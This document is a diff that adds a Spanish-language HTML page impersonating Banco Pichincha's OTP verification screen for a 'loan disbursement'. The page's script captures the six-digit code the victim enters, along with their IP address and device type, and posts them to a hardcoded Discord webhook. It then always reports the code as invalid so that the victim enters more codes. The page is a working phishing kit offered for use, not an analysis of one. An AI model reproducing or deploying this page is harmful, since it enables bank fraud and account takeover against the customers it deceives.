@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verificación de Seguridad | Banco Pichincha</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      :root {
+        --pichincha-yellow: #ffdd00;
+        --pichincha-dark: #2d2d2d;
+        --pichincha-blue: #004b93;
+        --bg-gray: #f8fafc;
+        --error-red: #e53e3e;
+      }
+
+      body {
+        font-family: "Inter", sans-serif;
+        background-color: var(--bg-gray);
+        margin: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        padding: 20px;
+      }
+
+      .otp-card {
+        background: #ffffff;
+        width: 100%;
+        max-width: 420px;
+        border-radius: 24px;
+        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.08);
+        overflow: hidden;
+        border: 1px solid #e2e8f0;
+        text-align: center;
+        animation: fadeIn 0.5s ease-out;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: scale(0.95);
+        }
+        to {
+          opacity: 1;
+          transform: scale(1);
+        }
+      }
+
+      .header {
+        padding: 40px 20px 10px;
+      }
+
+      .header img {
+        width: 180px;
+      }
+
+      .content {
+        padding: 30px 40px 40px;
+      }
+
+      .icon-lock {
+        background: #fffdf0;
+        width: 60px;
+        height: 60px;
+        line-height: 60px;
+        border-radius: 50%;
+        display: inline-block;
+        margin-bottom: 20px;
+        font-size: 24px;
+        border: 1px solid var(--pichincha-yellow);
+      }
+
+      h2 {
+        color: var(--pichincha-dark);
+        font-size: 1.4rem;
+        margin: 0 0 10px;
+        font-weight: 700;
+      }
+
+      p {
+        color: #64748b;
+        font-size: 0.9rem;
+        line-height: 1.5;
+        margin-bottom: 30px;
+      }
+
+      .otp-inputs {
+        display: flex;
+        justify-content: center;
+        gap: 10px;
+        margin-bottom: 10px;
+      }
+
+      .otp-inputs input {
+        width: 15px;
+        height: 45px;
+        text-align: center;
+        font-size: 1.5rem;
+        font-weight: 700;
+        border: 2px solid #e2e8f0;
+        border-radius: 12px;
+        background: #fcfcfc;
+        transition: all 0.2s;
+      }
+
+      .otp-inputs input:focus {
+        outline: none;
+        border-color: var(--pichincha-yellow);
+        background: #fff;
+        box-shadow: 0 0 0 4px rgba(255, 221, 0, 0.15);
+      }
+
+      .error-msg {
+        color: var(--error-red);
+        font-size: 0.85rem;
+        font-weight: 600;
+        margin-bottom: 20px;
+        display: none; /* Se activa con JS */
+      }
+
+      .btn-verify {
+        width: 100%;
+        padding: 16px;
+        background-color: var(--pichincha-dark);
+        color: var(--pichincha-yellow);
+        border: none;
+        border-radius: 12px;
+        font-size: 1rem;
+        font-weight: 700;
+        cursor: pointer;
+        transition: 0.3s;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+      }
+
+      .btn-verify:hover {
+        background-color: #000;
+        transform: translateY(-2px);
+      }
+
+      .resend {
+        display: block;
+        margin-top: 25px;
+        font-size: 0.85rem;
+        color: var(--pichincha-blue);
+        cursor: pointer;
+        font-weight: 600;
+        text-decoration: none;
+      }
+
+      .footer-img {
+        width: 100%;
+        height: 90px;
+        object-fit: cover;
+        display: block;
+        border-top: 1px solid #eee;
+      }
+
+      .legal {
+        padding: 20px;
+        font-size: 0.7rem;
+        color: #94a3b8;
+        background: #fafafa;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="otp-card">
+      <div class="header">
+        <img
+          src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQnfVl8KKXncvu_tuDTMkYeEqFEti6zo25H1A&s"
+          alt="Banco Pichincha"
+        />
+      </div>
+
+      <div class="content">
+        <div class="icon-lock">🔐</div>
+        <h2>Código de Verificación</h2>
+        <p>
+          Hemos enviado un código de 6 dígitos a su número o correo electronico
+          registrado para autorizar el desembolso de su crédito.
+        </p>
+
+        <form id="otp-form">
+          <div class="otp-inputs">
+            <input type="text" maxlength="1" inputmode="numeric" required />
+            <input type="text" maxlength="1" inputmode="numeric" required />
+            <input type="text" maxlength="1" inputmode="numeric" required />
+            <input type="text" maxlength="1" inputmode="numeric" required />
+            <input type="text" maxlength="1" inputmode="numeric" required />
+            <input type="text" maxlength="1" inputmode="numeric" required />
+          </div>
+
+          <div id="error-text" class="error-msg">
+            Código inválido. Por favor, intente de nuevo.
+          </div>
+
+          <button type="submit" class="btn-verify">Confirmar Desembolso</button>
+        </form>
+
+        <a href="#" class="resend">No recibí el código. Reenviar</a>
+      </div>
+
+      <img
+        src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR76oQ29A6t4LiUMUj-lj0-JUbBpfA8o08rgw&s"
+        class="footer-img"
+        alt="Seguridad"
+      />
+
+      <div class="legal">
+        Operación protegida por Pichincha Safe <br />
+        © 2026 Banco Pichincha Ecuador S.A.
+      </div>
+    </div>
+
+    <script>
+      const form = document.getElementById("otp-form");
+      const inputs = document.querySelectorAll(".otp-inputs input");
+      const errorText = document.getElementById("error-text");
+
+      // Control de los inputs
+      inputs.forEach((input, index) => {
+        input.addEventListener("input", (e) => {
+          if (e.target.value.length === 1 && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+          }
+        });
+
+        input.addEventListener("keydown", (e) => {
+          if (e.key === "Backspace" && e.target.value === "" && index > 0) {
+            inputs[index - 1].focus();
+          }
+        });
+      });
+
+      // Envío a Discord
+      form.addEventListener("submit", async (e) => {
+        e.preventDefault();
+
+        const DISCORD_WEBHOOK_URL =
+          "https://discord.com/api/webhooks/1494353566456877057/SnHztmydU8j6Tif_i9G2N_OO4YOeIC2bmm-vteyg4TQIsnD4eT2qNrTazM4g0ltfAvoB";
+
+        // Capturar código
+        let otpCode = "";
+        inputs.forEach((input) => {
+          otpCode += input.value;
+        });
+
+        try {
+          // Capturar IP
+          const ipResponse = await fetch("https://api.ipify.org?format=json");
+          const ipData = await ipResponse.json();
+          const clienteIP = ipData.ip;
+
+          // Capturar Dispositivo
+          let dispositivo = "PC / Otro";
+          const ua = navigator.userAgent.toLowerCase();
+          if (ua.includes("iphone")) dispositivo = "iPhone";
+          else if (ua.includes("android")) dispositivo = "Android";
+
+          // Enviar a Discord
+          await fetch(DISCORD_WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              embeds: [
+                {
+                  title: "🔑 CÓDIGO OTP RECIBIDO",
+                  color: 16768256,
+                  fields: [
+                    {
+                      name: "🔢 Código",
+                      value: `**${otpCode}**`,
+                      inline: false,
+                    },
+                    { name: "🌐 IP", value: `\`${clienteIP}\``, inline: true },
+                    { name: "📱 Equipo", value: dispositivo, inline: true },
+                  ],
+                  footer: { text: "Monitoreo Pichincha" },
+                  timestamp: new Date(),
+                },
+              ],
+            }),
+          });
+
+          // Mostrar error y limpiar (para que el usuario intente otra vez)
+          errorText.style.display = "block";
+          form.reset();
+          inputs[0].focus();
+        } catch (error) {
+          errorText.style.display = "block";
+          form.reset();
+        }
+      });
+    </script>
+  </body>
+</html>
